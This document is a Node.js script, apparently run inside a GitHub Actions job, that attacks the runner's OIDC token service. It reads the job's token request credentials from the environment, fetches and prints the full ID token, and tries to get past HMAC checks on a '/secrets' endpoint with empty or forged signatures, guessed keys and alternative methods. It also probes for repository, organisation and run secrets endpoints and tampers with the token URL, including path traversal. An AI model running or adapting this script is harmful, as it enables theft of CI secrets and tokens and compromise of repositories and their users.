const https = require('https');
const crypto = require('crypto');

const OIDC_URL = process.env.ACTIONS_ID_TOKEN_REQUEST_URL || '';
const OIDC_TOKEN = process.env.ACTIONS_ID_TOKEN_REQUEST_TOKEN || '';
const ORCHESTRATION_ID = process.env.ACTIONS_ORCHESTRATION_ID || '';
const GITHUB_REPOSITORY = process.env.GITHUB_REPOSITORY || '';

function get(hostname, path, extraHeaders) {
  return new Promise((resolve) => {
    const r = https.request({ hostname, path, method: 'GET',
      headers: { 'Authorization': 'Bearer ' + OIDC_TOKEN, ...(extraHeaders || {}) }
    }, (res) => { let d=''; res.on('data', c=>d+=c); res.on('end', () => resolve({ status: res.statusCode, body: d, headers: res.headers })); });
    r.on('error', e => resolve({ status: 'ERR', body: e.message }));
    r.end();
  });
}

function req(hostname, path, method, body, extraHeaders) {
  return new Promise((resolve) => {
    const s = body ? JSON.stringify(body) : '{}';
    const r = https.request({ hostname, path, method: method || 'GET',
      headers: { 'Authorization': 'Bearer ' + OIDC_TOKEN, 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(s), ...(extraHeaders || {}) }
    }, (res) => { let d=''; res.on('data', c=>d+=c); res.on('end', () => resolve({ status: res.statusCode, body: d, headers: res.headers })); });
    r.on('error', e => resolve({ status: 'ERR', body: e.message }));
    r.write(s); r.end();
  });
}

async function main() {
  if (!OIDC_URL || !OIDC_TOKEN) { console.log('Missing env'); return; }

  const oidcParsed = new URL(OIDC_URL);
  const host = oidcParsed.hostname;
  const poolId = oidcParsed.pathname.split('/')[1]; // e.g. "128"
  const runUUID = ORCHESTRATION_ID.split('.')[0];
  // Full URL pattern: /{poolId}//idtoken/{run_uuid}/{job_uuid}?api-version=2.0
  const urlParts = oidcParsed.pathname.split('/idtoken/');
  const idtokenBase = urlParts[0]; // e.g. /128/
  const jobUUID = oidcParsed.search.includes('api-version') ?
    (urlParts[1] || '').split('/')[1] || '' : '';
  // More reliable: extract from full URL
  const fullPathParts = (oidcParsed.pathname + oidcParsed.search).split('/');
  console.log('=== V17: OIDC JWT Decode + HMAC Bypass + Endpoint Discovery ===');
  console.log('Host:', host, '| Pool:', poolId);
  console.log('Full OIDC URL:', oidcParsed.pathname + oidcParsed.search);
  console.log('Repo:', GITHUB_REPOSITORY);

  // === PART 1: Decode full OIDC JWT ===
  console.log('\n=== PART 1: Full OIDC JWT claims ===');
  const r1 = await get(host, oidcParsed.pathname + oidcParsed.search + '&audience=api.github.com');
  if (r1.status === 200) {
    try {
      const resp = JSON.parse(r1.body);
      const jwt = resp.value;
      const parts = jwt.split('.');
      const header = JSON.parse(Buffer.from(parts[0], 'base64url').toString());
      const payload = JSON.parse(Buffer.from(parts[1], 'base64url').toString());
      console.log('[JWT] header:', JSON.stringify(header));
      console.log('[JWT] FULL PAYLOAD:');
      for (const [k, v] of Object.entries(payload)) {
        console.log('  ' + k + ':', JSON.stringify(v));
      }
      console.log('[JWT] Total JWT length:', jwt.length);
    } catch(e) { console.log('[JWT] Parse error:', e.message, '| Status:', r1.status); }
  }

  // === PART 2: HMAC bypass attempts ===
  const basePath = idtokenBase + '/'; // /128//
  console.log('\n=== PART 2: HMAC bypass on /secrets endpoint ===');

  // Try 1: Empty HMAC header
  const r2a = await req(host, basePath + 'secrets', 'GET', null, { 'X-HMAC-Signature': '' });
  console.log('[HMAC1] empty X-HMAC-Signature:', r2a.status, '|', r2a.body.substring(0, 100));

  // Try 2: Fake HMAC value
  const r2b = await req(host, basePath + 'secrets', 'GET', null, { 'X-HMAC-Signature': 'sha256=aabbcc', 'X-Signature': 'sha256=aabbcc' });
  console.log('[HMAC2] fake X-HMAC-Signature:', r2b.status, '|', r2b.body.substring(0, 100));

  // Try 3: GitHub webhook HMAC format (X-Hub-Signature-256)
  const r2c = await req(host, basePath + 'secrets', 'GET', null, { 'X-Hub-Signature-256': 'sha256=0000', 'X-Actions-Hmac': 'aabbcc' });
  console.log('[HMAC3] X-Hub-Signature-256:', r2c.status, '|', r2c.body.substring(0, 100));

  // Try 4: PUT vs GET (maybe HMAC only required for state-changing operations)
  const r2d = await req(host, basePath + 'secrets', 'POST', { list: true });
  console.log('[HMAC4] POST /secrets:', r2d.status, '|', r2d.body.substring(0, 100));

  // Try 5: OPTIONS (preflight — might skip HMAC)
  const r2e = await new Promise((resolve) => {
    const req2 = https.request({ hostname: host, path: basePath + 'secrets', method: 'OPTIONS',
      headers: { 'Authorization': 'Bearer ' + OIDC_TOKEN }
    }, (res) => { let d=''; res.on('data', c=>d+=c); res.on('end', () => resolve({ status: res.statusCode, body: d.substring(0, 200), headers: res.headers })); });
    req2.on('error', e => resolve({ status: 'ERR', body: e.message }));
    req2.end();
  });
  console.log('[HMAC5] OPTIONS /secrets:', r2e.status, '|', r2e.body.substring(0, 100), '| headers:', JSON.stringify(r2e.headers).substring(0, 200));

  // === PART 3: Try to derive HMAC key from known materials ===
  // The HMAC key might be the OIDC_TOKEN itself, or HMAC(OIDC_TOKEN, path), etc.
  console.log('\n=== PART 3: HMAC derivation attempts ===');
  const secretsPath = basePath + 'secrets';
  const candidate_keys = [
    OIDC_TOKEN,
    OIDC_TOKEN.split('.')[2] || '', // JWT signature part
    Buffer.from(OIDC_TOKEN).toString('hex').substring(0, 32),
    runUUID.replace(/-/g, ''),
    ORCHESTRATION_ID,
  ];
  for (const key of candidate_keys) {
    const sig = crypto.createHmac('sha256', key).update(secretsPath).digest('hex');
    const r = await req(host, secretsPath, 'GET', null, { 'X-HMAC-Signature': 'sha256=' + sig });
    if (r.status !== 400 || !r.body.includes('hmac is missing')) {
      console.log('[DERIVE] key=' + key.substring(0, 20) + '...: ' + r.status + ' | ' + r.body.substring(0, 100));
    } else {
      console.log('[DERIVE] key=' + key.substring(0, 20) + '...: still requires HMAC');
    }
  }

  // === PART 4: Additional endpoint discovery ===
  console.log('\n=== PART 4: Additional endpoints under /' + poolId + '// ===');
  const paths = [
    'runs', 'runs/' + runUUID, 'runs/' + runUUID + '/secrets', 'runs/' + runUUID + '/tokens',
    'jobs', 'jobs/' + jobUUID,
    'repository-secrets', 'org-secrets', 'environment-secrets',
    'v1/secrets', 'v2/secrets', 'api/secrets',
    'context', 'runner-context',
    'masks', 'masks/add',
    'oidc', 'token',
  ];
  for (const p of paths) {
    const r = await req(host, basePath + p, 'GET', null);
    if (!r.body.includes('hmac is missing') && r.status !== 'ERR') {
      console.log('[DISCOVER] /' + poolId + '//' + p + ': ' + r.status + ' | ' + r.body.substring(0, 150));
    }
  }

  // === PART 5: ID token URL path manipulation ===
  console.log('\n=== PART 5: OIDC URL path manipulation ===');
  const variations = [
    // Double slash traversal
    oidcParsed.pathname.replace('//', '/../../') + oidcParsed.search,
    // Without double slash
    oidcParsed.pathname.replace('//', '/') + oidcParsed.search,
    // api-version manipulation
    oidcParsed.pathname + '?api-version=1.0&audience=api.github.com',
    oidcParsed.pathname + '?api-version=3.0&audience=api.github.com',
    // No api-version
    oidcParsed.pathname + '?audience=api.github.com',
    // Different idtoken sub-path
    oidcParsed.pathname.replace('idtoken', 'id-token') + oidcParsed.search + '&audience=api.github.com',
  ];
  for (const v of variations) {
    const r = await get(host, v);
    if (r.status !== 400 || r.body.includes('value')) {
      console.log('[URL] ' + v.substring(0, 80) + '...: ' + r.status + ' | ' + r.body.substring(0, 150));
    } else {
      console.log('[URL] ' + v.substring(0, 60) + '...: ' + r.status + ' | ' + r.body.substring(0, 80));
    }
  }

  console.log('\nDone.');
}

main().catch(e => console.log('Fatal:', e.message));
